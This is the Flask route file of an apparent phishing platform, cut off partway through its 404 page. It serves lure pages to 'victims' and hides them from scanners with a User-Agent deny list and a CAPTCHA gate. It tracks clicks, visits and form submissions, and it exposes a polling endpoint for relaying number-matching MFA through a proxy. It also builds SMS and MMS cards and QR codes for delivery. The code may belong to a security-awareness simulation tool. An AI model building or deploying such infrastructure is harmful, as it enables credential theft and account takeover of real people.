"""
Phishing routes - handles victim traffic
"""
from flask import Blueprint, request, g, abort, send_file, session, redirect, make_response
from shared.database import db, Campaign, TrackedUser, TrackingEvent, Event, Template
from shared.template_render import render_sandboxed
from shared.turnstile import verify_turnstile
from shared.errors import CampaignNotFoundException, log_security_event
from phishing.workflow_executor import WorkflowExecutor
from pathlib import Path
from urllib.parse import urlparse
from jinja2.exceptions import TemplateError
import logging
import mimetypes
import uuid

logger = logging.getLogger(__name__)

phishing_bp = Blueprint('phishing', __name__)
workflow_executor = WorkflowExecutor()

@phishing_bp.before_request
def load_campaign():
    """Load campaign data - supports header, Host, and URL-based identification"""
    uid = None
    identification_method = None

    # Try header first (when proxied through Caddy)
    uid = request.headers.get('X-Campaign-ID')
    if uid:
        identification_method = 'header'
        logger.debug(f"Campaign identified via X-Campaign-ID header: {uid}")

    # Fallback: Host-based (domain routing when Caddy omits X-Campaign-ID on some requests)
    if not uid:
        host = (request.headers.get('Host') or '').split(':')[0].strip().lower()
        if host:
            campaign_by_host = Campaign.query.filter(
                Campaign.custom_domain.ilike(host),
                Campaign.status == 'active',
                Campaign.campaign_type == 'inbound',
            ).first()
            if campaign_by_host:
                uid = campaign_by_host.uid
                identification_method = 'host'
                logger.debug(f"Campaign identified via Host: {uid}")

    # Fallback to URL path (direct access or backward compatibility)
    if not uid:
        path_parts = request.path.strip('/').split('/')
        if path_parts and path_parts[0]:
            uid = path_parts[0]
            identification_method = 'url_path'
            logger.debug(f"Campaign identified via URL path: {uid}")
    
    # Skip campaign loading for static assets and special routes
    if not uid or uid in ['static', 'assets', 'favicon.ico', 'robots.txt', 'health', 'media', 'm']:
        return
    
    # Load campaign from database - only inbound campaigns can handle incoming requests
    campaign = Campaign.query.filter_by(uid=uid, status='active', campaign_type='inbound').first()
    
    # Debug logging for 404 issues
    if not campaign:
        # Check if campaign exists with different status or type
        campaign_any_status = Campaign.query.filter_by(uid=uid).first()
        if campaign_any_status:
            if campaign_any_status.campaign_type != 'inbound':
                logger.warning(
                    f"Campaign {uid} found but type is '{campaign_any_status.campaign_type}', not 'inbound'. "
                    f"Campaign ID: {campaign_any_status.id}, Name: {campaign_any_status.name}, "
                    f"Identification method: {identification_method}"
                )
            elif campaign_any_status.status != 'active':
                logger.warning(
                    f"Campaign {uid} found but status is '{campaign_any_status.status}', not 'active'. "
                    f"Campaign ID: {campaign_any_status.id}, Name: {campaign_any_status.name}, "
                    f"Identification method: {identification_method}"
                )
        else:
            logger.warning(
                f"Campaign with UID '{uid}' not found in database. "
                f"Identification method: {identification_method}"
            )
        
        log_security_event(
            'campaign_not_found',
            f'Attempt to access non-existent campaign: {uid}',
            {
                'ip': request.remote_addr,
                'user_agent': request.headers.get('User-Agent'),
                'path': request.path,
                'method': request.method,
                'identification_method': identification_method,
                'x_campaign_id_header': request.headers.get('X-Campaign-ID')
            }
        )
        abort(404)
    
    # Store campaign data in g for use in workflows
    g.campaign = campaign.to_dict(include_template=True)
    g.campaign_obj = campaign
    g.campaign_identification_method = identification_method
    # When identified via Host, ensure domain is available for get_campaign_url (no X-Campaign-Domain from Caddy)
    if identification_method == 'host':
        g.campaign_domain = (request.headers.get('Host') or '').split(':')[0].strip()
    
    # Generate session ID if not exists
    if not session.get('session_id'):
        session['session_id'] = str(uuid.uuid4())
        session.permanent = True


def get_campaign_url(campaign_uid: str, path: str = '') -> str:
    """
    Generate a redirect-safe campaign URL.

    Uses relative paths so the browser stays on whatever domain the visitor
    accessed through (important when behind a CDN like Azure Front Door or
    Cloudflare — an absolute URL built from X-Campaign-Domain would redirect
    the visitor from the CDN domain to the backend origin).

    Args:
        campaign_uid: Campaign UID
        path: Optional path to append

    Returns:
        Relative campaign URL suitable for redirect()
    """
    # Check for domain-based routing (Caddy header or Host-based identification)
    campaign_domain = request.headers.get('X-Campaign-Domain') or getattr(g, 'campaign_domain', None)

    if campaign_domain:
        # Domain-based routing — Caddy routes by host, so a relative path
        # is sufficient and keeps the visitor on their current domain
        return path or '/'
    else:
        # UID-based routing — must include campaign UID in the path
        return f'/{campaign_uid}{path}'


def _is_allowed_redirect_target(target_url: str, campaign_obj) -> bool:
    """
    Decide whether a victim-supplied ``target=`` redirect URL is permitted
    for the given campaign.

    Allows:
      * Same-origin relative paths (must start with ``/``).
      * Absolute http/https URLs whose host equals ``campaign.custom_domain``.
      * Absolute http/https URLs whose host is in
        ``campaign.config['allowed_redirect_hosts']`` (list of hostnames).

    Rejects everything else: non-http(s) schemes (javascript:, data:, file:, ...),
    protocol-relative URLs (``//evil.tld``), cross-origin destinations not on
    the allowlist, and malformed input. Closes the open-redirect that fed the
    stored-XSS chain.
    """
    if not target_url or not isinstance(target_url, str):
        return False

    # Protocol-relative URLs ("//host/path") would otherwise sneak past the
    # scheme check; reject explicitly.
    if target_url.startswith('//'):
        return False

    try:
        parsed = urlparse(target_url)
    except Exception:
        return False

    # Relative path: no scheme, no netloc, must start with '/'
    if not parsed.scheme and not parsed.netloc:
        return parsed.path.startswith('/')

    if parsed.scheme not in ('http', 'https'):
        return False

    host = (parsed.hostname or '').lower()
    if not host:
        return False

    custom_domain = (getattr(campaign_obj, 'custom_domain', None) or '').lower()
    if custom_domain and host == custom_domain:
        return True

    config = getattr(campaign_obj, 'config', None) or {}
    allowed = config.get('allowed_redirect_hosts') or []
    if not isinstance(allowed, list):
        return False

    return any(host == str(entry).strip().lower() for entry in allowed if entry)


@phishing_bp.route('/', methods=['GET', 'POST'])
def campaign_root():
    """Handle root path when campaign is identified via X-Campaign-ID header (domain-based routing)."""
    if hasattr(g, 'campaign_obj'):
        return campaign_page(g.campaign_obj.uid)
    abort(404)


@phishing_bp.route('/<uid>')
@phishing_bp.route('/<uid>/')
def campaign_page(uid):
    """Handle main campaign page requests"""
    # Campaign already loaded in before_request
    if not hasattr(g, 'campaign') or not hasattr(g, 'campaign_obj'):
        abort(404)
    
    campaign_dict = g.campaign  # Dictionary for tracking logic
    campaign_obj = g.campaign_obj  # Campaign object for workflow operations
    actual_uid = campaign_obj.uid  # Use from loaded campaign, not parameter
    
    # Check User-Agent filtering (before tracking and workflow execution)
    if hasattr(campaign_obj, 'ua_filter_enabled') and getattr(campaign_obj, 'ua_filter_enabled', False):
        user_agent = request.headers.get('User-Agent', '').lower()
        deny_list = getattr(campaign_obj, 'ua_deny_list', None) or []
        
        # Check if User-Agent contains any denied string
        blocked = False
        matched_string = None
        for deny_string in deny_list:
            if deny_string.lower() in user_agent:
                blocked = True
                matched_string = deny_string
                break
        
        if blocked:
            # Log the blocked request
            from shared.errors import log_security_event
            log_security_event(
                'ua_filter_blocked',
                f'User-Agent blocked for campaign {actual_uid}',
                {
                    'ip': request.remote_addr,
                    'user_agent': request.headers.get('User-Agent'),
                    'matched_string': matched_string,
                    'campaign_id': campaign_dict['id']
                }
            )
            logger.info(f"User-Agent blocked for campaign {actual_uid}: {matched_string} in {request.headers.get('User-Agent')}")
            
            # Render blocked template
            ua_blocked_template_id = getattr(campaign_obj, 'ua_blocked_template_id', None)
            if ua_blocked_template_id:
                blocked_template = Template.query.get(ua_blocked_template_id)
                if blocked_template and blocked_template.template_html:
                    try:
                        # Build context for template rendering
                        template_context = {
                            'campaign': {
                                'name': campaign_obj.name,
                                'uid': campaign_obj.uid
                            },
                            'request': {
                                'ip_address': request.remote_addr,
                                'user_agent': request.headers.get('User-Agent'),
                                'path': request.path
                            },
                            'variables': campaign_obj.variables or {}
                        }
                        
                        # Render with sandboxed Jinja2 (single-pass, autoescape on)
                        rendered_html = render_sandboxed(
                            blocked_template.template_html, template_context
                        )

                        return make_response(rendered_html, 200)
                    except Exception as e:
                        logger.error(f"Error rendering blocked template for campaign {actual_uid}: {e}")
                        # Fall through to normal workflow if template rendering fails
                else:
                    logger.warning(f"Blocked template {ua_blocked_template_id} not found or empty for campaign {actual_uid}")
                    # Fall through to normal workflow if template not found
    
    # Check for tracking parameter
    tracking_id = request.args.get('t')
    if tracking_id:
        # Log page visit with tracking
        try:
            tracked_user = TrackedUser.query.filter_by(
                campaign_id=campaign_dict['id'],
                tracking_id=tracking_id
            ).first()
            
            if tracked_user:
                tracking_event = TrackingEvent(
                    tracked_user_id=tracked_user.id,
                    event_type='page_visited',
                    ip_address=request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr),
                    user_agent=request.headers.get('User-Agent'),
                    additional_data={
                        'referer': request.headers.get('Referer'),
                        'campaign_uid': actual_uid,
                        'page_path': request.path,
                        'query_params': dict(request.args)
                    }
                )
                
                db.session.add(tracking_event)
                db.session.commit()
                
                # Store tracking info in session for later use
                session['tracking_id'] = tracking_id
                session['tracked_user_id'] = tracked_user.id
                
                logger.info(f"Page visit tracked for user {tracked_user.email} in campaign {actual_uid}")
        except Exception as e:
            logger.error(f"Failed to log tracked page visit: {e}")

    # Campaign-level CAPTCHA gate: before running workflows, require CAPTCHA pass if enabled
    captcha_enabled = getattr(campaign_obj, "captcha_enabled", False)
    captcha_template_id = getattr(campaign_obj, "captcha_template_id", None)
    campaign_config = campaign_obj.config or {}
    captcha_site_key = campaign_config.get("captcha_site_key")
    captcha_secret_key = campaign_config.get("captcha_secret_key")
    session_passed = session.get(f"captcha_passed_{campaign_obj.id}")

    if (
        captcha_enabled
        and captcha_template_id
        and captcha_site_key
        and captcha_secret_key
        and not session_passed
    ):
        if request.method == "GET":
            # Show CAPTCHA page
            captcha_template = Template.query.get(captcha_template_id)
            if not captcha_template or not captcha_template.template_html:
                logger.warning(f"CAPTCHA template {captcha_template_id} not found for campaign {actual_uid}")
            else:
                template_context = {
                    "campaign": {
                        "id": campaign_obj.id,
                        "uid": campaign_obj.uid,
                        "name": campaign_obj.name,
                    },
                    "request": {
                        "path": request.path,
                        "ip_address": request.remote_addr,
                    },
                    "variables": campaign_obj.variables or {},
                    "captcha_site_key": captcha_site_key,
                }
                rendered = render_sandboxed(captcha_template.template_html, template_context)
                return make_response(rendered, 200)
        elif request.method == "POST":
            # Validate CAPTCHA token
            token = request.form.get("cf-turnstile-response", "").strip()
            if not token:
                captcha_template = Template.query.get(captcha_template_id)
                error_context = {
                    "campaign": {"id": campaign_obj.id, "uid": campaign_obj.uid, "name": campaign_obj.name},
                    "request": {"path": request.path},
                    "variables": campaign_obj.variables or {},
                    "captcha_site_key": captcha_site_key,
                    "captcha_error": "CAPTCHA is required. Please complete the challenge.",
                }
                if captcha_template and captcha_template.template_html:
                    rendered = render_sandboxed(captcha_template.template_html, error_context)
                    return make_response(rendered, 400)
                return make_response(
                    "<html><body><h1>CAPTCHA required</h1><p>Please complete the challenge and try again.</p></body></html>",
                    400,
                )
            if verify_turnstile(token, captcha_secret_key, remote_ip=request.remote_addr):
                session[f"captcha_passed_{campaign_obj.id}"] = True
                session.modified = True
                return redirect(get_campaign_url(actual_uid))
            captcha_template = Template.query.get(captcha_template_id)
            error_context = {
                "campaign": {"id": campaign_obj.id, "uid": campaign_obj.uid, "name": campaign_obj.name},
                "request": {"path": request.path},
                "variables": campaign_obj.variables or {},
                "captcha_site_key": captcha_site_key,
                "captcha_error": "CAPTCHA verification failed. Please try again.",
            }
            if captcha_template and captcha_template.template_html:
                rendered = render_sandboxed(captcha_template.template_html, error_context)
                return make_response(rendered, 400)
            return make_response(
                "<html><body><h1>CAPTCHA verification failed</h1><p>Please try again.</p></body></html>",
                400,
            )

    try:
        # Execute workflow based on HTTP method
        if request.method == 'GET':
            if not campaign_obj.get_workflow_id:
                logger.error(f"Campaign {actual_uid} has no GET workflow assigned")
                abort(500)
            response = workflow_executor.execute_get(campaign_obj)
        elif request.method == 'POST':
            if not campaign_obj.post_workflow_id:
                logger.error(f"Campaign {actual_uid} has no POST workflow assigned")
                abort(500)
            response = workflow_executor.execute_post(campaign_obj)
        else:
            abort(405)  # Method not allowed
        
        return response
            
    except ValueError as e:
        # Validation errors
        logger.warning(f"Campaign {actual_uid} validation error: {e}", extra={
            'campaign_id': campaign_dict['id'],
            'error_type': 'validation_error',
            'user_ip': request.remote_addr
        })
        abort(400)
    except KeyError as e:
        # Missing configuration or template data
        logger.error(f"Campaign {actual_uid} configuration error: {e}", extra={
            'campaign_id': campaign_dict['id'],
            'error_type': 'configuration_error',
            'user_ip': request.remote_addr
        })
        abort(500)
    except TemplateError as e:
        # Jinja2 template rendering errors
        logger.error(f"Campaign {actual_uid} template error: {e}", extra={
            'campaign_id': campaign_dict['id'],
            'error_type': 'template_error',
            'user_ip': request.remote_addr
        })
        abort(500)
    except Exception as e:
        # Catch-all for unexpected errors
        logger.exception(f"Unexpected error in campaign {actual_uid}: {e}", extra={
            'campaign_id': campaign_dict['id'],
            'get_workflow_id': campaign_dict.get('get_workflow_id'),
            'post_workflow_id': campaign_dict.get('post_workflow_id'),
            'error_type': 'unexpected_error',
            'user_ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent'),
            'request_path': request.path,
            'request_method': request.method
        })
        abort(500)

@phishing_bp.route('/<uid>', methods=['POST'])
def campaign_page_post(uid):
    """Handle POST requests to campaign pages"""
    return campaign_page(uid)

@phishing_bp.route('/<uid>/track/<tracking_id>/<event_type>')
def tracking_pixel(uid, tracking_id, event_type):
    """Handle tracking pixel and event requests"""
    if not hasattr(g, 'campaign') or not hasattr(g, 'campaign_obj'):
        abort(404)
    campaign = g.campaign
    actual_uid = g.campaign_obj.uid
    
    # Check for button click tracking with redirect
    if event_type == 'button_clicked':
        target_url = request.args.get('target')
        if target_url:
            # Validate the redirect destination against the campaign's allowlist
            # before doing anything else. Closes the open-redirect that fed the
            # stored-XSS delivery vector.
            if not _is_allowed_redirect_target(target_url, g.campaign_obj):
                log_security_event(
                    'open_redirect_blocked',
                    f'Blocked redirect target for campaign {actual_uid}',
                    {
                        'ip': request.remote_addr,
                        'tracking_id': tracking_id,
                        'target_url': target_url,
                        'campaign_id': campaign['id']
                    }
                )
                logger.warning(
                    f"Blocked open-redirect attempt for campaign {actual_uid}: "
                    f"target={target_url!r} ip={request.remote_addr}"
                )
                return redirect(get_campaign_url(actual_uid))

            # Log the button click event
            try:
                tracked_user = TrackedUser.query.filter_by(
                    campaign_id=campaign['id'],
                    tracking_id=tracking_id
                ).first()

                if tracked_user:
                    tracking_event = TrackingEvent(
                        tracked_user_id=tracked_user.id,
                        event_type=event_type,
                        ip_address=request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr),
                        user_agent=request.headers.get('User-Agent'),
                        additional_data={
                            'target_url': target_url,
                            'referer': request.headers.get('Referer'),
                            'button_context': request.args.get('context', 'unknown')
                        }
                    )

                    db.session.add(tracking_event)
                    db.session.commit()

                    logger.info(f"Button click tracked for user {tracked_user.email} in campaign {actual_uid}, redirecting to {target_url}")

                    # Redirect to target URL
                    return redirect(target_url)
            except Exception as e:
                logger.error(f"Failed to log button click event: {e}")
                db.session.rollback()

            # Fallback redirect even if tracking fails (target already validated)
            return redirect(target_url)
    
    # Log the tracking event (for pixels and other events)
    try:
        tracked_user = TrackedUser.query.filter_by(
            campaign_id=campaign['id'],
            tracking_id=tracking_id
        ).first()
        
        if tracked_user:
            tracking_event = TrackingEvent(
                tracked_user_id=tracked_user.id,
                event_type=event_type,
                ip_address=request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr),
                user_agent=request.headers.get('User-Agent'),
                additional_data={
                    'referer': request.headers.get('Referer'),
                    'additional_params': dict(request.args)
                }
            )
            db.session.add(tracking_event)
            if event_type in ('form_submitted', 'form_submit'):
                campaign_event = Event(
                    campaign_id=campaign['id'],
                    event_type='form_submitted',
                    data=dict(request.args),
                    ip_address=request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr),
                    user_agent=request.headers.get('User-Agent'),
                )
                db.session.add(campaign_event)
            db.session.commit()
            logger.info(f"Tracking event: {event_type} for user {tracked_user.email} in campaign {actual_uid}")
        else:
            if event_type in ('form_submitted', 'form_submit'):
                campaign_event = Event(
                    campaign_id=campaign['id'],
                    event_type='form_submitted',
                    data=dict(request.args),
                    ip_address=request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr),
                    user_agent=request.headers.get('User-Agent'),
                )
                db.session.add(campaign_event)
                db.session.commit()
            logger.warning(f"Tracking event for unknown tracking_id: {tracking_id}")
            
    except Exception as e:
        logger.error(f"Failed to log tracking event: {e}")
        db.session.rollback()
    
    # Return 1x1 transparent pixel for pixel requests
    pixel_path = Path(__file__).parent.parent / 'static' / '1x1.png'
    if pixel_path.exists():
        return send_file(pixel_path, mimetype='image/png')
    else:
        # Generate minimal pixel response
        from flask import Response
        # 1x1 transparent PNG
        pixel_data = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\tpHYs\x00\x00\x0b\x13\x00\x00\x0b\x13\x01\x00\x9a\x9c\x18\x00\x00\x00\nIDATx\x9cc\xf8\x00\x00\x00\x01\x00\x01\x00\x00\x00\x00IEND\xaeB`\x82'
        return Response(pixel_data, mimetype='image/png')

@phishing_bp.route('/<uid>/proxy-status/<session_id>', methods=['GET'])
def proxy_status(uid, session_id):
    """Polling endpoint for number-matching MFA. Returns JSON status."""
    from flask import jsonify
    # Validate the session belongs to this user
    stored_sid = session.get('_sync_proxy_session_id')
    if not stored_sid or stored_sid != session_id:
        return jsonify({'status': 'failed', 'error': 'Invalid session'}), 403

    from workflows.sync_proxy_manager import get_sync_proxy_manager
    manager = get_sync_proxy_manager()
    if not manager:
        return jsonify({'status': 'failed', 'error': 'Service unavailable'}), 503

    proxy_session = manager.get_session(session_id)
    if not proxy_session:
        return jsonify({'status': 'timeout'})

    result = proxy_session.check_status(timeout=2)
    return jsonify(result)


@phishing_bp.route('/proxy-status/<session_id>', methods=['GET'])
def proxy_status_root(session_id):
    """Domain-routed version of proxy-status (X-Campaign-ID header)."""
    from flask import jsonify
    stored_sid = session.get('_sync_proxy_session_id')
    if not stored_sid or stored_sid != session_id:
        return jsonify({'status': 'failed', 'error': 'Invalid session'}), 403

    from workflows.sync_proxy_manager import get_sync_proxy_manager
    manager = get_sync_proxy_manager()
    if not manager:
        return jsonify({'status': 'failed', 'error': 'Service unavailable'}), 503

    proxy_session = manager.get_session(session_id)
    if not proxy_session:
        return jsonify({'status': 'timeout'})

    result = proxy_session.check_status(timeout=2)
    return jsonify(result)


@phishing_bp.route('/<uid>/callback')
def oauth_callback(uid):
    """Handle OAuth callbacks - redirects to main campaign page"""
    if not hasattr(g, 'campaign'):
        abort(404)
    
    # Use domain from header if available, otherwise use UID-based URL
    campaign_domain = request.headers.get('X-Campaign-Domain') or getattr(g, 'campaign_domain', None)
    if campaign_domain:
        # Redirect to domain root (Caddy will handle routing)
        scheme = 'https' if request.is_secure else 'http'
        return redirect(f'{scheme}://{campaign_domain}')
    else:
        # Fallback to UID-based URL
        actual_uid = g.campaign['uid']
        return redirect(f'/{actual_uid}')

@phishing_bp.route('/<uid>/js/tracking.js')
def tracking_script(uid):
    """Serve JavaScript tracking client"""
    if not hasattr(g, 'campaign'):
        abort(404)
    campaign = g.campaign
    actual_uid = campaign['uid']  # Use from loaded campaign
    
    # Generate JavaScript tracking client
    js_code = f"""
// Reel Tracking Client v2.0
(function() {{
    var CAMPAIGN_UID = '{actual_uid}';
    var TRACKING_ID = '{session.get("tracking_id", "")}';
    var BASE_URL = window.location.origin;
    
    function trackEvent(eventData) {{
        if (!TRACKING_ID) return;
        
        var trackingUrl = BASE_URL + '/' + CAMPAIGN_UID + '/track/' + TRACKING_ID + '/' + eventData.event_type;
        
        // Send tracking request
        var img = new Image();
        img.src = trackingUrl + '?' + Object.keys(eventData)
            .filter(key => key !== 'event_type')
            .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(eventData[key]))
            .join('&');
    }}
    
    // Auto-track form submissions
    document.addEventListener('submit', function(e) {{
        if (TRACKING_ID) {{
            trackEvent({{
                event_type: 'form_submitted',
                form_id: e.target.id || 'unknown',
                form_action: e.target.action || '',
                timestamp: Date.now()
            }});
        }}
    }});
    
    // Auto-track link clicks (with data-track attribute)
    document.addEventListener('click', function(e) {{
        var element = e.target;
        var trackEvent = element.getAttribute('data-track-event');
        
        if (trackEvent && TRACKING_ID) {{
            trackEvent({{
                event_type: trackEvent,
                element_tag: element.tagName,
                element_text: element.innerText || element.value || '',
                timestamp: Date.now()
            }});
        }}
    }});
    
    // Expose trackEvent globally
    window.trackEvent = trackEvent;
    
    // Track page visibility changes
    document.addEventListener('visibilitychange', function() {{
        if (TRACKING_ID && document.visibilityState === 'hidden') {{
            trackEvent({{
                event_type: 'page_hidden',
                time_on_page: Date.now() - (window.pageLoadTime || Date.now()),
                timestamp: Date.now()
            }});
        }}
    }});
    
    // Track page load time
    window.pageLoadTime = Date.now();
    
}})();
"""
    
    from flask import Response
    return Response(js_code, mimetype='application/javascript')


@phishing_bp.route('/static/<path:filename>')
def serve_static_assets(filename):
    """
    Serve global static assets (ASSETS_FOLDER).
    Allows local testing when hitting the phishing app directly (e.g. localhost:1234)
    without Caddy; in production Caddy serves /static/* via file_server.
    """
    from shared.config import Config
    config = Config()
    if '..' in filename or filename.startswith('/'):
        abort(400)
    assets_root = Path(config.ASSETS_FOLDER).resolve()
    file_path = (assets_root / filename).resolve()
    if not file_path.is_file() or not str(file_path).startswith(str(assets_root)):
        abort(404)
    mimetype, _ = mimetypes.guess_type(filename)
    return send_file(str(file_path), mimetype=mimetype or 'application/octet-stream', max_age=0)


@phishing_bp.route('/assets/<path:filename>')
def serve_template_assets(filename):
    """
    Serve template assets (TEMPLATES_FOLDER/<id>/assets).
    Resolves campaign from X-Campaign-ID (Caddy), Referer path, or ?campaign= query.
    Used for local testing without Caddy.
    """
    from shared.config import Config
    config = Config()
    if '..' in filename or filename.startswith('/'):
        abort(400)
    uid = request.headers.get('X-Campaign-ID')
    if not uid:
        referer = request.headers.get('Referer')
        if referer:
            path = urlparse(referer).path.strip('/')
            path_parts = path.split('/') if path else []
            if path_parts:
                uid = path_parts[0]
    if not uid:
        uid = request.args.get('campaign')
    if not uid:
        abort(404)
    campaign = Campaign.query.filter_by(uid=uid, campaign_type='inbound').first()
    if not campaign:
        abort(404)
    # Use template from session when workflow rendered "Template from library"; else campaign's template
    template_id = None
    session_tid = session.get('_rendered_template_id')
    if session_tid is not None:
        try:
            tid = int(session_tid)
            if Template.query.get(tid):
                template_id = tid
        except (ValueError, TypeError):
            pass
    if template_id is None:
        template_id = campaign.template_id
    if not template_id:
        template_id = getattr(campaign, 'captcha_template_id', None)
    if not template_id:
        abort(404)
    assets_dir = Path(config.TEMPLATES_FOLDER) / str(template_id) / 'assets'
    assets_dir = assets_dir.resolve()
    file_path = (assets_dir / filename).resolve()
    if not file_path.is_file() or not str(file_path).startswith(str(assets_dir)):
        abort(404)
    mimetype, _ = mimetypes.guess_type(filename)
    return send_file(str(file_path), mimetype=mimetype or 'application/octet-stream', max_age=0)


@phishing_bp.route('/<uid>/assets/<path:filename>')
def campaign_assets(uid, filename):
    """Serve campaign-specific assets"""
    if not hasattr(g, 'campaign') or not hasattr(g, 'campaign_obj'):
        abort(404)
    campaign = g.campaign
    actual_uid = g.campaign_obj.uid
    
    # Security check - prevent path traversal
    if '..' in filename or filename.startswith('/'):
        abort(400)
    
    # Look for asset in campaign assets directory
    assets_path = Path('storage/assets') / actual_uid
    asset_file = assets_path / filename
    
    if asset_file.exists() and asset_file.is_file():
        return send_file(asset_file)
    
    # Fallback to shared assets
    shared_assets_path = Path('static') / filename
    if shared_assets_path.exists() and shared_assets_path.is_file():
        return send_file(shared_assets_path)
    
    abort(404)

@phishing_bp.route('/m/<render_uuid>')
def mms_card_render(render_uuid):
    """
    Serve a dynamically generated MMS card image by render UUID.
    Unauthenticated — Twilio must be able to fetch this URL.
    Looks up the SmsJob by UUID to get target data and which card template
    to use. Target data and template name never appear in the URL.
    """
    import hashlib
    import os
    import re as _re
    import tempfile
    import time

    from shared.database import Setting, SmsJob
    from shared.mms_card import generate_card_image

    # Validate UUID format
    if not _re.match(r'^[a-f0-9-]{36}$', render_uuid):
        abort(400)

    # Look up SmsJob — provides both config_id and target data
    sms_job = SmsJob.query.filter_by(render_uuid=render_uuid).first()
    if not sms_job or not sms_job.mms_card_config_id:
        abort(404)

    config_id = sms_job.mms_card_config_id
    config_data = Setting.get_setting(f'mms_card_{config_id}')
    if not config_data or not isinstance(config_data, dict):
        abort(404)

    target_data = sms_job.target_data or {}

    # Cache by UUID (deterministic — same job always renders the same card)
    cache_dir = Path('storage/cache/mms_cards')
    cache_dir.mkdir(parents=True, exist_ok=True)

    cache_key = hashlib.sha256(
        f"{config_id}:{render_uuid}".encode()
    ).hexdigest()[:24]
    cache_path = cache_dir / f"{cache_key}.png"

    if cache_path.exists():
        age = time.time() - cache_path.stat().st_mtime
        if age < 3600:
            return send_file(str(cache_path), mimetype='image/png')

    # Generate image
    try:
        png_bytes = generate_card_image(config_data, target_data)
    except Exception as e:
        logger.error(f"MMS card generation failed for {render_uuid}: {e}", exc_info=True)
        abort(500)

    # Atomic write to cache
    try:
        fd, tmp_path = tempfile.mkstemp(dir=str(cache_dir), suffix='.tmp')
        os.write(fd, png_bytes)
        os.close(fd)
        os.replace(tmp_path, str(cache_path))
    except Exception as e:
        logger.warning(f"Cache write failed for {render_uuid}: {e}")

    from flask import Response
    return Response(png_bytes, mimetype='image/png')


@phishing_bp.route('/media/text-image')
def media_text_image():
    """
    Render text as a PNG image on demand.
    Unauthenticated — Twilio must be able to fetch this URL.
    Query params:
        t  – base64url-encoded text (required, max 500 chars decoded)
        fs – font size (default 64, max 200)
        w  – width (default 600, max 2000)
        h  – height (default 200, max 2000)
        bg – background hex color (default #FFFFFF)
        tc – text hex color (default #000000)
    """
    import base64 as _b64
    import hashlib
    import os
    import tempfile
    import time

    from shared.media_generator import generate_text_image

    # Decode text
    t_param = request.args.get('t', '')
    if not t_param:
        abort(400)
    try:
        text = _b64.urlsafe_b64decode(t_param).decode('utf-8')
    except Exception:
        abort(400)
    if len(text) > 500:
        abort(400)

    # Parse style params
    config = {}
    try:
        fs = request.args.get('fs')
        if fs:
            config['font_size'] = min(int(fs), 200)
        w = request.args.get('w')
        if w:
            config['width'] = min(int(w), 2000)
        h = request.args.get('h')
        if h:
            config['height'] = min(int(h), 2000)
    except (ValueError, TypeError):
        abort(400)
    bg = request.args.get('bg')
    if bg:
        config['bg_color'] = bg
    tc = request.args.get('tc')
    if tc:
        config['text_color'] = tc

    # Cache
    cache_dir = Path('storage/cache/media')
    cache_dir.mkdir(parents=True, exist_ok=True)

    cache_key = hashlib.sha256(
        f"text:{text}:{sorted(config.items())}".encode()
    ).hexdigest()[:24]
    cache_path = cache_dir / f"{cache_key}.png"

    if cache_path.exists():
        age = time.time() - cache_path.stat().st_mtime
        if age < 3600:
            return send_file(str(cache_path), mimetype='image/png')

    # Generate
    try:
        png_bytes = generate_text_image(text, config)
    except Exception as e:
        logger.error(f"Text image generation failed: {e}", exc_info=True)
        abort(500)

    # Atomic write
    try:
        fd, tmp_path = tempfile.mkstemp(dir=str(cache_dir), suffix='.tmp')
        os.write(fd, png_bytes)
        os.close(fd)
        os.replace(tmp_path, str(cache_path))
    except Exception as e:
        logger.warning(f"Cache write failed for text-image: {e}")

    from flask import Response
    return Response(png_bytes, mimetype='image/png')


@phishing_bp.route('/media/qr')
def media_qr_code():
    """
    Generate a QR code PNG on demand.
    Unauthenticated — Twilio must be able to fetch this URL.
    Query params:
        d  – base64url-encoded data (required, max 2000 chars decoded)
        bs – box_size (default 10)
        b  – border (default 4)
        fc – fill color hex (default #000000)
        bg – background color hex (default #FFFFFF)
        ec – error correction L/M/Q/H (default M)
    """
    import base64 as _b64
    import hashlib
    import os
    import tempfile
    import time

    from shared.media_generator import generate_qr_image

    # Decode data
    d_param = request.args.get('d', '')
    if not d_param:
        abort(400)
    try:
        data = _b64.urlsafe_b64decode(d_param).decode('utf-8')
    except Exception:
        abort(400)
    if len(data) > 2000:
        abort(400)

    # Parse QR params
    config = {}
    try:
        bs = request.args.get('bs')
        if bs:
            config['box_size'] = int(bs)
        b = request.args.get('b')
        if b:
            config['border'] = int(b)
    except (ValueError, TypeError):
        abort(400)
    fc = request.args.get('fc')
    if fc:
        config['fill_color'] = fc
    bg = request.args.get('bg')
    if bg:
        config['bg_color'] = bg
    ec = request.args.get('ec')
    if ec and ec in ('L', 'M', 'Q', 'H'):
        config['error_correction'] = ec

    # Cache
    cache_dir = Path('storage/cache/media')
    cache_dir.mkdir(parents=True, exist_ok=True)

    cache_key = hashlib.sha256(
        f"qr:{data}:{sorted(config.items())}".encode()
    ).hexdigest()[:24]
    cache_path = cache_dir / f"{cache_key}.png"

    if cache_path.exists():
        age = time.time() - cache_path.stat().st_mtime
        if age < 3600:
            return send_file(str(cache_path), mimetype='image/png')

    # Generate
    try:
        png_bytes = generate_qr_image(data, config)
    except Exception as e:
        logger.error(f"QR code generation failed: {e}", exc_info=True)
        abort(500)

    # Atomic write
    try:
        fd, tmp_path = tempfile.mkstemp(dir=str(cache_dir), suffix='.tmp')
        os.write(fd, png_bytes)
        os.close(fd)
        os.replace(tmp_path, str(cache_path))
    except Exception as e:
        logger.warning(f"Cache write failed for qr: {e}")

    from flask import Response
    return Response(png_bytes, mimetype='image/png')


@phishing_bp.route('/health')
def health_check():
    """Health check endpoint for monitoring"""
    return {'status': 'ok', 'service': 'phishing'}, 200

DEFAULT_404_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Page not found</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; margin: 50px; }
        .container { max-width: 600px; }
        h1 { color: #0078d4; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Page not found</h1>
